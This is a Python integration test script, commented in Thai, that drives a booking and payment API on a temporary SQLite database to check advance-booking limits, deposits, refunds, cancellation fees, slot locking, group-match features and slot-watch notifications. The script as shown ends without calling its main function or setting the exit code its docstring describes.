"""ทดสอบการจองและการชำระเงินแบบยิงผ่าน API จริง

ทำไมต้องยิงจริง: บั๊ก "จองล่วงหน้าได้ 20000 วัน" ไม่ได้เกิดจากสูตรคำนวณผิด
แต่เกิดจาก "ไม่มีใครตรวจ" ซึ่งการอ่านโค้ดเปล่า ๆ มองไม่เห็น ต้องยิงคำขอเข้าไปดู

รันบน SQLite ในไฟล์ชั่วคราว **ไม่แตะฐานข้อมูลจริง** ข้อมูลทดสอบถูกลบทิ้งเมื่อจบ

วิธีรัน (จากโฟลเดอร์โปรเจกต์)
    docker compose exec api python tests/test_booking_payment.py

หรือรันนอก container ถ้าติดตั้ง requirements.txt กับ httpx ไว้แล้ว
    python3 tests/test_booking_payment.py

จบด้วยรหัส 0 = ผ่านหมด · 1 = มีข้อที่ไม่ผ่าน (เอาไปต่อกับ CI ได้เลย)
"""
import os
import sys
import tempfile
from datetime import date, timedelta

DB = tempfile.NamedTemporaryFile(suffix=".db", delete=False).name
os.environ.update({
    "DATABASE_URL": f"sqlite:///{DB}",
    "SEED_ON_START": "true",
    "JWT_SECRET": "verify-only-secret",
    "SERVE_WEB": "false",
    "UPLOAD_DIR": tempfile.mkdtemp(),
})
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import app.main as main_mod            # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

# run_migrations เขียนด้วย SQL ของ PostgreSQL (information_schema) ซึ่ง SQLite ไม่มี
# ข้ามได้ปลอดภัย เพราะ create_all สร้างคอลัมน์ครบตามโมเดลปัจจุบันอยู่แล้ว
main_mod.run_migrations = lambda engine: None

from app.routers.bookings import MAX_ADVANCE_DAYS  # noqa: E402

ok = fail = skipped = 0


def skip(label, why):
    """บันทึกว่าบล็อกทดสอบถูกข้าม

    **สำคัญ**: ชุดทดสอบที่ข้ามบล็อกเงียบ ๆ อันตรายกว่าชุดที่ไม่มีเทสต์เลย
    เพราะมันขึ้นว่า "ไม่ผ่าน 0" ทั้งที่ไม่ได้ทดสอบอะไร
    (เคยเกิดจริง — บล็อกเฝ้าช่องเวลาไม่เคยรันเลยสักครั้ง เพราะไปล็อกวันที่ไว้
    แล้ววันนั้นดันเป็นวันที่ร้านปิด)
    """
    global skipped
    skipped += 1
    print(f"  ⏭️  ข้าม: {label} — {why}")


def check(label, got, want):
    global ok, fail
    if got == want:
        ok += 1
        print(f"  ✅ {label}")
    else:
        fail += 1
        print(f"  ❌ {label}  ได้ {got} ควรเป็น {want}")


def find_free_slot(c, service_id, staff_id=None, start=3, span=14):
    """ไล่หาวันแรกที่มีช่องว่าง เริ่มจากวันนี้ + start วัน

    ห้ามล็อกวันที่ตายตัว เพราะร้านตัวอย่างมีวันหยุดประจำสัปดาห์
    ถ้ารันเทสต์วันพฤหัส "วันนี้ + 4" คือวันจันทร์ ซึ่งร้านสปาปิด
    บล็อกนั้นจะถูกข้ามทั้งที่ระบบไม่ได้พัง

    คืนค่า (วันที่เป็นข้อความ, ช่องเวลาที่ว่าง, ช่องทั้งหมดของวันนั้น)
    หรือ (None, None, []) ถ้าไล่ครบแล้วไม่เจอเลย
    """
    for d in range(start, start + span):
        day = str(date.today() + timedelta(days=d))
        url = f"/api/services/{service_id}/availability?date={day}"
        if staff_id:
            url += f"&staff_id={staff_id}"
        slots = c.get(url).json()["slots"]
        free = next((x for x in slots if x["available"]), None)
        if free:
            return day, free, slots
    return None, None, []


def main():
    with TestClient(main_mod.app) as c:
        def login(u, p="Password123"):
            r = c.post("/api/auth/login", json={"username": u, "password": p})
            assert r.status_code == 200, r.text
            return {"Authorization": f"Bearer {r.json()['access_token']}"}

        cust = login("mind")

        # หาร้านที่มีบริการแบบนัดเวลา (ไม่ใช่ส่งของด่วน) มาหนึ่งร้าน
        shops = c.get("/api/shops?limit=50").json()["items"]
        target = svc = None
        for s in shops:
            detail = c.get(f"/api/shops/{s['id']}").json()
            for x in detail.get("services", []):
                if x.get("is_active", True):
                    target, svc = detail, x
                    break
            if svc:
                break
        assert svc, "ไม่พบบริการสำหรับทดสอบ"
        print(f"\nใช้ร้าน «{target['name']}» บริการ «{svc['name']}»\n")

        today = date.today()

        def book(on_date, at="10:00:00"):
            return c.post("/api/bookings", headers=cust, json={
                "shop_id": target["id"], "service_id": svc["id"],
                "booking_date": on_date.isoformat(), "booking_time": at,
            })

        print("1) เพดานการจองล่วงหน้า")
        check("จอง 20000 วันข้างหน้า ต้องถูกปฏิเสธ",
              book(today + timedelta(days=20000)).status_code, 422)
        check(f"จอง {MAX_ADVANCE_DAYS + 1} วัน (เกิน 1 วัน) ต้องถูกปฏิเสธ",
              book(today + timedelta(days=MAX_ADVANCE_DAYS + 1)).status_code, 422)
        check("จองย้อนหลังเมื่อวาน ต้องถูกปฏิเสธ",
              book(today - timedelta(days=1)).status_code, 422)

        r = book(today + timedelta(days=20000))
        msg = r.json().get("detail", "")
        check("ข้อความบอกเพดานเป็นภาษาไทยและมีตัวเลขวัน",
              str(MAX_ADVANCE_DAYS) in msg and "ล่วงหน้า" in msg, True)

        print("\n2) หน้าดูคิวว่างต้องปิดวันที่เกินเพดานด้วย")
        far = (today + timedelta(days=20000)).isoformat()
        av = c.get(f"/api/services/{svc['id']}/availability?date={far}").json()
        check("วันไกลเกินเพดาน ต้องไม่มีช่องเวลาว่างให้กด",
              [s for s in av.get("slots", []) if s.get("is_available")], [])
        check("ต้องบอกเหตุผลว่าปิดเพราะอะไร",
              bool(av.get("closed_reason")), True)

        print("\n3) จองในช่วงที่รับได้ ต้องยังจองได้ตามปกติ")
        made = None
        for d in range(1, 15):
            r = book(today + timedelta(days=d))
            if r.status_code == 201:
                made = r.json()
                break
        check("จองในช่วง 14 วันข้างหน้าได้อย่างน้อยหนึ่งวัน", made is not None, True)
        if not made:
            return
        print(f"     (จองได้วันที่ {made['booking_date']} {made['booking_time']})")

        print("\n4) เลื่อนนัดต้องติดเพดานเดียวกัน")
        # ถ้าไม่ตรวจตอนเลื่อนนัด จะเลี่ยงกฎได้ด้วยการจองพรุ่งนี้แล้วเลื่อนไปปี 2080
        rs = c.patch(f"/api/bookings/{made['id']}/reschedule", headers=cust, json={
            "booking_date": (today + timedelta(days=20000)).isoformat(),
            "booking_time": "10:00:00",
        })
        check("เลื่อนนัดไป 20000 วัน ต้องถูกปฏิเสธ", rs.status_code, 422)

        print("\n5) การชำระเงิน")
        pay = c.post(f"/api/bookings/{made['id']}/payment", headers=cust,
                     json={"kind": "deposit", "method": "promptpay"})
        check("จ่ายมัดจำคิวในอนาคต ต้องสำเร็จ", pay.status_code, 201)
        if pay.status_code == 201:
            summary = pay.json()
            check("สถานะเปลี่ยนเป็นจ่ายมัดจำแล้ว", summary["state"], "deposit_paid")
            check("ยอดคงเหลือ = ราคาเต็ม - มัดจำ",
                  float(summary["outstanding"]),
                  round(float(summary["total_price"]) - float(summary["paid_amount"]), 2))
            check("คิวถูกยืนยันอัตโนมัติหลังจ่ายมัดจำ",
                  c.get(f"/api/bookings/{made['id']}", headers=cust).json()["status"],
                  "confirmed")

            pid = summary["payments"][-1]["id"]

            print("\n6) คืนเงิน — ต้องยกเลิกคิวก่อน")
            owner = login(target.get("owner_username") or "spaowner")
            rf = c.post(f"/api/payments/{pid}/refund", headers=owner)
            check("คืนเงินคิวที่ยังใช้งานอยู่ ต้องถูกปฏิเสธ", rf.status_code, 409)

            c.delete(f"/api/bookings/{made['id']}", headers=cust)
            after = c.get(f"/api/bookings/{made['id']}", headers=cust).json()
            check("ยกเลิกคิวสำเร็จ", after["status"], "cancelled")

            rf2 = c.post(f"/api/payments/{pid}/refund", headers=owner)
            check("ยกเลิกแล้วคืนเงินได้", rf2.status_code, 200)
            rf3 = c.post(f"/api/payments/{pid}/refund", headers=owner)
            check("คืนซ้ำรอบสองต้องไม่ได้", rf3.status_code, 409)

            check("คืนเงินแล้ว ยอดที่จ่ายกลับเป็นศูนย์",
                  float(c.get(f"/api/bookings/{made['id']}/payment",
                              headers=cust).json()["paid_amount"]), 0.0)

        print("\n7) จ่ายมัดจำคิวที่เลยเวลานัดไปแล้ว")
        # สร้างคิวในอดีตตรง ๆ ผ่านฐานข้อมูล เพราะ API กันการจองย้อนหลังไว้แล้ว
        from app.database import SessionLocal
        from app.models import Booking
        db = SessionLocal()
        try:
            src = db.get(Booking, made["id"])
            past = Booking(
                user_id=src.user_id, shop_id=src.shop_id, service_id=src.service_id,
                booking_code="BVTEST0001",
                booking_date=today - timedelta(days=2), booking_time=src.booking_time,
                end_time=src.end_time, status="pending",
                total_price=src.total_price, deposit_amount=src.deposit_amount,
            )
            db.add(past)
            db.commit()
            past_id = past.id
        finally:
            db.close()

        pp = c.post(f"/api/bookings/{past_id}/payment", headers=cust,
                    json={"kind": "deposit", "method": "promptpay"})
        check("ลูกค้าจ่ายมัดจำคิวเมื่อวานซืน ต้องถูกปฏิเสธ", pp.status_code, 409)

        cash = c.post(f"/api/bookings/{past_id}/payment", headers=cust,
                      json={"kind": "balance", "method": "cash"})
        check("ลูกค้ากดจ่ายเงินสดเองจากที่บ้านไม่ได้", cash.status_code, 403)

        bb = c.post(f"/api/bookings/{past_id}/payment", headers=cust,
                    json={"kind": "balance", "method": "promptpay"})
        check("แต่จ่ายค่าบริการเต็มจำนวนย้อนหลังได้", bb.status_code, 201)
        if bb.status_code == 201:
            check("จ่ายเต็มแล้วสถานะต้องเป็นชำระครบ", bb.json()["state"], "paid")

        print("\n8) ร้านกดรับเงินสดหลังลูกค้าใช้บริการเสร็จ")
        # กติกา "ห้ามจ่ายมัดจำย้อนหลัง" ต้องไม่บล็อกงานจริงของหน้าร้าน
        # พนักงานกดรับเงินหลังลูกค้าใช้บริการเสร็จ ซึ่งเลยเวลานัดไปแล้วเป็นปกติ
        db = SessionLocal()
        try:
            src = db.get(Booking, past_id)
            walkin = Booking(
                user_id=src.user_id, shop_id=src.shop_id, service_id=src.service_id,
                booking_code="BVTEST0002",
                booking_date=today - timedelta(days=1), booking_time=src.booking_time,
                end_time=src.end_time, status="pending",
                total_price=src.total_price, deposit_amount=src.deposit_amount,
            )
            db.add(walkin)
            db.commit()
            walkin_id = walkin.id
        finally:
            db.close()

        owner = login("spaowner")
        shop_cash = c.post(f"/api/bookings/{walkin_id}/payment", headers=owner,
                           json={"kind": "deposit", "method": "cash"})
        check("ร้านบันทึกเงินสดคิวเมื่อวานได้ ไม่ติดกฎมัดจำ", shop_cash.status_code, 201)

        print("\n9) ยังไม่จ่าย = ยังไม่ล็อกช่องเวลา ใครจ่ายก่อนได้ก่อน")
        # หัวใจของกติกา: กดจองเฉย ๆ ต้องไม่กันเวลาให้ใคร
        nong = login("nong")          # ลูกค้าอีกคนในข้อมูลตัวอย่าง

        # ผูกคิวไว้กับ "ช่างคนเดียวกัน" เพื่อให้ความจุของช่องเวลานี้เท่ากับ 1 คิวพอดี
        # ถ้าไม่ระบุช่าง ร้านที่มีช่างหลายคนจะรับได้หลายคิวพร้อมกัน ซึ่งถูกต้องอยู่แล้ว
        # แต่จะทดสอบเรื่อง "แย่งช่องเวลากัน" ไม่ได้
        staff_list = [s for s in target.get("staff", []) if s.get("is_active", True)]
        pick_staff = staff_list[0]["id"] if staff_list else None

        def book_slot(who, on_date, at):
            body = {"shop_id": target["id"], "service_id": svc["id"],
                    "booking_date": on_date.isoformat(), "booking_time": at}
            if pick_staff:
                body["staff_id"] = pick_staff
            return c.post("/api/bookings", headers=who, json=body)

        slot_date = slot_time = first = None
        for d in range(1, 15):
            on = today + timedelta(days=d)
            av = c.get(f"/api/services/{svc['id']}/availability?date={on.isoformat()}"
                       + (f"&staff_id={pick_staff}" if pick_staff else "")).json()
            free = [s for s in av.get("slots", []) if s["available"]]
            if not free:
                continue
            r = book_slot(cust, on, free[0]["time"])
            if r.status_code == 201:
                first = r.json()
                slot_date, slot_time = on, first["booking_time"]
                break
        check("จองคิวแรกได้", first is not None, True)
        if first is None:
            return

        check("คิวที่ยังไม่จ่าย ต้องยังไม่ล็อกช่องเวลา", first["holds_slot"], False)

        # ลูกค้าคนที่สองเลือกเวลาเดียวกัน "กับช่างคนเดียวกัน" ได้ เพราะคนแรกยังไม่จ่าย
        r2 = book_slot(nong, slot_date, slot_time)
        check("ลูกค้าอีกคนจองเวลาเดียวกันได้ ตราบใดที่ยังไม่มีใครจ่าย", r2.status_code, 201)
        second = r2.json() if r2.status_code == 201 else None

        def slot_open(on_date, at):
            url = (f"/api/services/{svc['id']}/availability?date={on_date.isoformat()}"
                   + (f"&staff_id={pick_staff}" if pick_staff else ""))
            rows = c.get(url).json().get("slots", [])
            return next((s["available"] for s in rows if s["time"].startswith(at[:5])), None)

        check("หน้าจองยังโชว์ว่าช่องนี้ว่างอยู่", slot_open(slot_date, slot_time), True)

        print("\n10) คนที่จ่ายก่อนได้คิวไป คนที่เหลือถูกปฏิเสธตอนจ่าย")
        p1 = c.post(f"/api/bookings/{first['id']}/payment", headers=cust,
                    json={"kind": "deposit", "method": "promptpay"})
        check("คนแรกจ่ายมัดจำสำเร็จ", p1.status_code, 201)
        check("จ่ายแล้วต้องล็อกช่องเวลาทันที",
              c.get(f"/api/bookings/{first['id']}", headers=cust).json()["holds_slot"], True)

        if second:
            p2 = c.post(f"/api/bookings/{second['id']}/payment", headers=nong,
                        json={"kind": "deposit", "method": "promptpay"})
            check("คนที่สองจ่ายไม่ได้แล้ว เพราะโดนตัดหน้า", p2.status_code, 409)
            check("ข้อความต้องบอกทางออกให้ผู้ใช้ (เลื่อนนัด)",
                  "เลื่อนนัด" in p2.json().get("detail", ""), True)

        check("จ่ายแล้วช่องนี้ต้องปิดในหน้าจอง", slot_open(slot_date, slot_time), False)

        print("\n11) ลูกค้ายกเลิกเอง ต้องถูกหักค่ามัดจำ 20%")
        info = c.get(f"/api/bookings/{first['id']}", headers=cust).json()
        deposit = float(info["deposit_amount"])
        check("ค่ามัดจำ = 20% ของค่าบริการ",
              round(deposit, 2), round(float(info["total_price"]) * 0.2, 2))

        cancelled = c.delete(f"/api/bookings/{first['id']}", headers=cust)
        check("ยกเลิกสำเร็จ", cancelled.status_code, 200)
        check("ข้อความบอกว่าถูกหักค่ามัดจำ",
              "หักค่ามัดจำ" in cancelled.json().get("message", ""), True)

        after = c.get(f"/api/bookings/{first['id']}", headers=cust).json()
        check("บันทึกว่าลูกค้าเป็นคนยกเลิก", after["cancelled_by"], "customer")
        check("ยอดที่ถูกหัก = ค่ามัดจำที่จ่ายมา", float(after["cancellation_fee"]), deposit)
        check("ยกเลิกแล้วต้องปล่อยช่องเวลาคืน", after["holds_slot"], False)

        check("ช่องเวลากลับมาว่างให้คนอื่นจอง", slot_open(slot_date, slot_time), True)

        print("\n12) ร้านเป็นฝ่ายยกเลิก ลูกค้าต้องไม่ถูกหัก")
        r5 = None
        for d in range(1, 15):
            rr = book(today + timedelta(days=d), "14:00:00")
            if rr.status_code == 201:
                r5 = rr.json()
                break
        check("จองคิวสำหรับทดสอบได้", r5 is not None, True)
        if r5:
            c.post(f"/api/bookings/{r5['id']}/payment", headers=cust,
                   json={"kind": "deposit", "method": "promptpay"})
            byshop = c.delete(f"/api/bookings/{r5['id']}", headers=owner)
            check("ร้านยกเลิกได้", byshop.status_code, 200)
            done = c.get(f"/api/bookings/{r5['id']}", headers=cust).json()
            check("บันทึกว่าร้านเป็นคนยกเลิก", done["cancelled_by"], "shop")
            check("ร้านยกเลิกต้องไม่หักค่ามัดจำ", float(done["cancellation_fee"]), 0.0)
            check("ข้อความบอกว่าจะคืนเงินเต็มจำนวน",
                  "คืนเงิน" in byshop.json().get("message", ""), True)

        print("\n13) คิวที่ไม่มีใครจ่าย ยกเลิกแล้วไม่ถูกหักอะไร")
        r6 = None
        for d in range(1, 15):
            rr = book(today + timedelta(days=d), "15:00:00")
            if rr.status_code == 201:
                r6 = rr.json()
                break
        if r6:
            free_cancel = c.delete(f"/api/bookings/{r6['id']}", headers=cust)
            check("ยกเลิกคิวที่ยังไม่จ่ายได้", free_cancel.status_code, 200)
            check("ไม่มีข้อความหักเงิน เพราะไม่เคยจ่าย",
                  "หัก" in free_cancel.json().get("message", ""), False)
            check("ค่าปรับเป็นศูนย์",
                  float(c.get(f"/api/bookings/{r6['id']}", headers=cust)
                        .json()["cancellation_fee"]), 0.0)

    # ==================================================================
    # ก๊วน — หาคนไปเล่นด้วยกัน (ตอบฟีดแบ็กอาจารย์ข้อ 2)
    # ==================================================================
    print("\n--- ก๊วน ---")
    cats = {x["slug"]: x["id"] for x in c.get("/api/categories").json()}

    def first_shop(slug):
        r = c.get(f"/api/shops?category_id={cats[slug]}&limit=1").json()
        return r["items"][0] if r["items"] else None

    court = first_shop("badminton")
    salon = first_shop("spa-massage")

    if court:
        detail = c.get(f"/api/shops/{court['id']}").json()
        sv = next((x for x in detail["services"] if x["is_active"]), None)
        st = next((x for x in detail["staff"] if x["is_active"]), None)
        day, free, _ = find_free_slot(c, sv["id"], st["id"], start=3)

        if free:
            mk = c.post("/api/bookings", headers=cust, json={
                "service_id": sv["id"], "staff_id": st["id"],
                "booking_date": day, "booking_time": free["time"],
            })
            check("จองคอร์ทแบดเพื่อทดสอบก๊วนได้", mk.status_code, 201)
            bk = mk.json()

            # ยังไม่จ่าย = ยังไม่ล็อกเวลา = เปิดก๊วนไม่ได้
            early = c.post(f"/api/bookings/{bk['id']}/open-match", headers=cust,
                           json={"open_slots": 5, "share_price": 100})
            check("คิวที่ยังไม่จ่าย เปิดก๊วนไม่ได้", early.status_code, 409)

            c.post(f"/api/bookings/{bk['id']}/payment", headers=cust,
                   json={"kind": "deposit", "method": "promptpay"})

            op = c.post(f"/api/bookings/{bk['id']}/open-match", headers=cust,
                        json={"open_slots": 5, "share_price": 100,
                              "match_note": "มือใหม่มาได้"})
            check("จ่ายแล้วเปิดก๊วนได้", op.status_code, 200)
            check("ยังรับได้อีก 5 คน", op.json()["slots_left"], 5)

            lst = c.get(f"/api/matches?shop_id={court['id']}").json()
            check("ก๊วนโผล่ในรายการก๊วนที่หาคน",
                  any(m["booking_id"] == bk["id"] for m in lst), True)

            self_join = c.post(f"/api/bookings/{bk['id']}/join", headers=cust)
            check("เจ้าของก๊วนเข้าร่วมก๊วนตัวเองไม่ได้", self_join.status_code, 400)

            j1 = c.post(f"/api/bookings/{bk['id']}/join", headers=nong)
            check("คนอื่นเข้าร่วมก๊วนได้", j1.status_code, 201)
            check("ยอดที่ต้องจ่ายถูกคัดลอกมาตอนเข้าร่วม",
                  float(j1.json()["share_amount"]), 100.0)

            dup = c.post(f"/api/bookings/{bk['id']}/join", headers=nong)
            check("ลงชื่อซ้ำไม่ได้", dup.status_code, 409)

            lst2 = c.get(f"/api/matches?shop_id={court['id']}").json()
            m2 = next((m for m in lst2 if m["booking_id"] == bk["id"]), None)
            check("จำนวนที่ยังรับได้ลดลงเหลือ 4", m2["slots_left"] if m2 else None, 4)

            out = c.delete(f"/api/bookings/{bk['id']}/join", headers=nong)
            check("ถอนตัวจากก๊วนได้", out.status_code, 200)
            lst3 = c.get(f"/api/matches?shop_id={court['id']}").json()
            m3 = next((m for m in lst3 if m["booking_id"] == bk["id"]), None)
            check("ถอนตัวแล้วที่ว่างกลับมาเป็น 5", m3["slots_left"] if m3 else None, 5)

            back = c.post(f"/api/bookings/{bk['id']}/join", headers=nong)
            check("ถอนตัวแล้วกลับเข้ามาใหม่ได้", back.status_code, 201)
        else:
            skip("ก๊วน", "ไม่มีช่องว่างในคอร์ทแบดวันที่ทดสอบ")
    else:
        skip("ก๊วน", "ไม่พบคอร์ทแบดในข้อมูลตัวอย่าง")

    if salon:
        d2 = c.get(f"/api/shops/{salon['id']}").json()
        sv2 = next((x for x in d2["services"] if x["is_active"]), None)
        day2, fr2, _ = find_free_slot(c, sv2["id"], start=4)
        if fr2:
            b2 = c.post("/api/bookings", headers=cust, json={
                "service_id": sv2["id"], "booking_date": day2, "booking_time": fr2["time"],
            }).json()
            c.post(f"/api/bookings/{b2['id']}/payment", headers=cust,
                   json={"kind": "deposit", "method": "promptpay"})
            no = c.post(f"/api/bookings/{b2['id']}/open-match", headers=cust,
                        json={"open_slots": 3, "share_price": 50})
            check("ร้านสปาเปิดก๊วนไม่ได้ (ไม่ใช่กิจกรรมกลุ่ม)", no.status_code, 400)
        else:
            skip("สปาเปิดก๊วนไม่ได้", "ไม่มีช่องว่างในร้านสปาวันที่ทดสอบ")
    else:
        skip("สปาเปิดก๊วนไม่ได้", "ไม่พบร้านสปาในข้อมูลตัวอย่าง")

    # ==================================================================
    # ผังทรัพยากร x เวลา (ตอบฟีดแบ็กอาจารย์ข้อ 3)
    # ==================================================================
    print("\n--- ผังทรัพยากร x เวลา ---")
    if court:
        detail = c.get(f"/api/shops/{court['id']}").json()
        sv = next((x for x in detail["services"] if x["is_active"]), None)
        day = str(date.today() + timedelta(days=5))
        g = c.get(f"/api/services/{sv['id']}/grid?date={day}")
        check("ขอผังได้", g.status_code, 200)
        gd = g.json()
        n_staff = len([x for x in detail["staff"] if x["is_active"]])
        check("จำนวนแถวเท่ากับจำนวนคอร์ทที่เปิดอยู่", len(gd["rows"]), n_staff)
        check("มีหัวคอลัมน์เวลา", len(gd["times"]) > 0, True)
        check("คำเรียกทรัพยากรมาจากฐานข้อมูล", gd["resource_label"], "คอร์ท")
        row = gd["rows"][0]
        check("แต่ละแถวมีช่องเวลาของตัวเอง", len(row["slots"]) > 0, True)
        check("ความจุของแต่ละคอร์ทคือ 1", row["slots"][0]["capacity"], 1)
    else:
        skip("ผังทรัพยากร x เวลา", "ไม่พบคอร์ทแบดในข้อมูลตัวอย่าง")

    # ==================================================================
    # เฝ้าช่องเวลาที่เต็ม — การยกเลิกต้องส่งต่อโอกาสให้คนที่รออยู่
    # ==================================================================
    print("\n--- เฝ้าช่องเวลา ---")
    if not salon:
        skip("เฝ้าช่องเวลา", "ไม่พบร้านสปาในข้อมูลตัวอย่าง")
    else:
        detail = c.get(f"/api/shops/{salon['id']}").json()
        sv = next((x for x in detail["services"]
                   if x["is_active"] and x["booking_mode"] == "scheduled"), None)
        st = next((x for x in detail["staff"] if x["is_active"]), None)

        # ไล่หาวันที่ว่างจริง ไม่ล็อกวันตายตัว
        # ร้านมีวันหยุดประจำสัปดาห์ ถ้าล็อกวันไว้แล้วบังเอิญตรงวันปิด
        # บล็อกนี้จะถูกข้ามโดยไม่มีใครรู้ (เกิดขึ้นมาแล้วจริง ๆ)
        day = free = None
        if sv and st:
            for d in range(3, 15):
                day = str(date.today() + timedelta(days=d))
                av = c.get(
                    f"/api/services/{sv['id']}/availability?date={day}&staff_id={st['id']}"
                ).json()
                free = next((x for x in av["slots"] if x["available"]), None)
                if free:
                    break

        if not (sv and st):
            skip("เฝ้าช่องเวลา", "ร้านนี้ไม่มีบริการแบบมีปฏิทินหรือไม่มีช่าง")
        elif not free:
            skip("เฝ้าช่องเวลา", "ไม่มีช่องว่างเลยใน 14 วันข้างหน้า")
        else:
            # ลูกค้าคนแรกจองแล้วจ่ายมัดจำ ช่องถูกล็อก
            b = c.post("/api/bookings", headers=cust, json={
                "service_id": sv["id"], "staff_id": st["id"],
                "booking_date": day, "booking_time": free["time"],
            }).json()
            c.post(f"/api/bookings/{b['id']}/pay", headers=cust,
                   json={"method": "credit_card"})

            # ลูกค้าคนที่สองเฝ้าช่วงเวลานั้นไว้
            other = login("nong")
            before = len(c.get("/api/notifications", headers=other).json()["items"])
            w = c.post("/api/watches", headers=other, json={
                "service_id": sv["id"], "staff_id": st["id"],
                "watch_date": day, "from_time": "00:00", "to_time": "23:59",
            })
            check("เฝ้าช่วงเวลาได้", w.status_code, 201)

            # เฝ้าซ้ำช่วงเดิมไม่ได้ กันสแปมแจ้งเตือน
            dup = c.post("/api/watches", headers=other, json={
                "service_id": sv["id"], "staff_id": st["id"],
                "watch_date": day, "from_time": "00:00", "to_time": "23:59",
            })
            check("เฝ้าช่วงเดิมซ้ำไม่ได้", dup.status_code, 409)

            check("เวลาเริ่มต้องมาก่อนเวลาจบ", c.post("/api/watches", headers=other, json={
                "service_id": sv["id"], "watch_date": day,
                "from_time": "20:00", "to_time": "18:00",
            }).status_code, 400)

            check("เฝ้าวันที่ผ่านไปแล้วไม่ได้", c.post("/api/watches", headers=other, json={
                "service_id": sv["id"],
                "watch_date": str(date.today() - timedelta(days=1)),
                "from_time": "10:00", "to_time": "12:00",
            }).status_code, 400)

            # หัวใจของฟีเจอร์: ยกเลิกแล้วคนที่รอต้องได้รับแจ้งเตือน
            c.delete(f"/api/bookings/{b['id']}", headers=cust)
            after = c.get("/api/notifications", headers=other).json()["items"]
            check("ยกเลิกแล้วคนที่เฝ้าไว้ได้รับแจ้งเตือน", len(after) > before, True)
            check("แจ้งเตือนเป็นชนิดช่องว่าง",
                  any(x["kind"] == "slot_free" for x in after), True)

            # แจ้งไปแล้วต้องไม่ค้างอยู่ในรายการที่ยังรอ ไม่งั้นจะแจ้งซ้ำ
            still = c.get("/api/watches?only_active=true", headers=other).json()
            check("แจ้งแล้วรายการหลุดจากคิวรอ",
                  any(x["id"] == w.json()["id"] for x in still), False)

# ==================================================================
    # ก๊วนแบบยังไม่จอง — ตอบฟีดแบ็กอาจารย์ข้อ 2 ให้ครบ
    # (open-match ต้องจ่ายมัดจำก่อน คนไม่มีเพื่อนจึงยังใช้ไม่ได้)
    # ==================================================================
    print("\n--- โพสต์หาคนก่อนจอง ---")
    day = str(date.today() + timedelta(days=7))
    req = c.post("/api/match-requests", headers=cust, json={
        "sport": "football", "district": "ลาดพร้าว", "play_date": day,
        "from_time": "20:00", "to_time": "22:00", "need_people": 2,
        "note": "มือใหม่มาได้",
    })
    check("โพสต์หาคนได้โดยยังไม่ต้องจองสนาม", req.status_code, 201)

    if req.status_code == 201:
        rid = req.json()["id"]
        check("เริ่มต้นยังไม่มีใครกดสนใจ", req.json()["interested_count"], 0)

        check("กีฬาที่ไม่รองรับต้องถูกปฏิเสธ", c.post("/api/match-requests", headers=cust, json={
            "sport": "spa-massage", "play_date": day,
            "from_time": "20:00", "to_time": "22:00", "need_people": 2,
        }).status_code, 422)

        check("วันที่ผ่านไปแล้วโพสต์ไม่ได้", c.post("/api/match-requests", headers=cust, json={
            "sport": "football", "play_date": str(date.today() - timedelta(days=1)),
            "from_time": "20:00", "to_time": "22:00", "need_people": 2,
        }).status_code, 400)

        friend = login("nong")
        j = c.post(f"/api/match-requests/{rid}/interest", headers=friend, json={})
        check("กดสนใจได้", j.status_code, 200)
        check("นับจำนวนคนสนใจถูก", j.json()["interested_count"], 1)
        check("ยังขาดอีกหนึ่งคน", j.json()["people_left"], 1)

        check("กดสนใจซ้ำไม่ได้",
              c.post(f"/api/match-requests/{rid}/interest",
                     headers=friend, json={}).status_code, 409)

        # เจ้าของโพสต์กดสนใจโพสต์ตัวเองไม่ได้ ไม่งั้นตัวเลขจะหลอกคนอื่น
        check("เจ้าของโพสต์กดสนใจตัวเองไม่ได้",
              c.post(f"/api/match-requests/{rid}/interest",
                     headers=cust, json={}).status_code, 400)

        lst = c.get(f"/api/match-requests?sport=football&date={day}").json()
        check("โพสต์ขึ้นในรายการสาธารณะ",
              any(x["id"] == rid for x in lst), True)

        out = c.delete(f"/api/match-requests/{rid}/interest", headers=friend)
        check("ถอนความสนใจได้", out.status_code, 200)
        check("ถอนแล้วตัวเลขลดลง",
              next(x["interested_count"] for x in
                   c.get(f"/api/match-requests?date={day}").json() if x["id"] == rid), 0)
        check("ถอนซ้ำไม่ได้",
              c.delete(f"/api/match-requests/{rid}/interest",
                       headers=friend).status_code, 404)

        # คนอื่นปิดโพสต์ของเราไม่ได้
        check("คนอื่นปิดโพสต์ไม่ได้",
              c.delete(f"/api/match-requests/{rid}", headers=friend).status_code, 403)
        check("เจ้าของปิดโพสต์เองได้",
              c.delete(f"/api/match-requests/{rid}", headers=cust).status_code, 200)
        check("ปิดแล้วหลุดจากรายการสาธารณะ",
              any(x["id"] == rid for x in
                  c.get(f"/api/match-requests?date={day}").json()), False)

    # ==================================================================
    # แนะนำเวลาที่ไม่ทำให้ตารางร้านแตก + เสนอรอบถัดไป
    # ==================================================================
    print("\n--- แนะนำเวลาและรอบถัดไป ---")
    if not salon:
        skip("ป้ายช่องเวลาที่แนะนำ", "ไม่พบร้านสปาในข้อมูลตัวอย่าง")
    else:
        detail = c.get(f"/api/shops/{salon['id']}").json()
        sv = next((x for x in detail["services"]
                   if x["is_active"] and x["booking_mode"] == "scheduled"), None)
        st = next((x for x in detail["staff"] if x["is_active"]), None)
        if sv and st:
            _, _, slots = find_free_slot(c, sv["id"], st["id"], start=8)
            # all() ของรายการว่างได้ True เสมอ ต้องเช็กก่อนว่ามีช่องจริง
            # ไม่งั้นเจอวันร้านปิดแล้วสามข้อล่างจะผ่านทั้งที่ไม่ได้ตรวจอะไร
            check("หาวันที่ร้านเปิดเจอ", len(slots) > 0, True)
            check("ทุกช่องมีป้ายบอกว่าคุ้มจะจองไหม",
                  all("fits_well" in x for x in slots), True)
            check("ทุกช่องมีจำนวนนาทีที่จะเสียไป",
                  all(isinstance(x["wasted_minutes"], int) for x in slots), True)
            # ถ้าแนะนำว่า "ดี" ก็ต้องไม่มีเวลาตายเหลือ ไม่งั้นป้ายขัดแย้งกันเอง
            check("ช่องที่แนะนำต้องไม่มีเวลาตาย",
                  all(x["wasted_minutes"] == 0 for x in slots if x["fits_well"]), True)
        else:
            skip("ป้ายช่องเวลาที่แนะนำ", "ร้านนี้ไม่มีบริการแบบมีปฏิทินหรือไม่มีช่าง")

    nr = c.get("/api/me/next-rounds", headers=cust)
    check("ขอรายการรอบถัดไปได้", nr.status_code, 200)
    check("ต้องล็อกอินก่อนถึงจะดูรอบถัดไปได้",
          c.get("/api/me/next-rounds").status_code, 401)
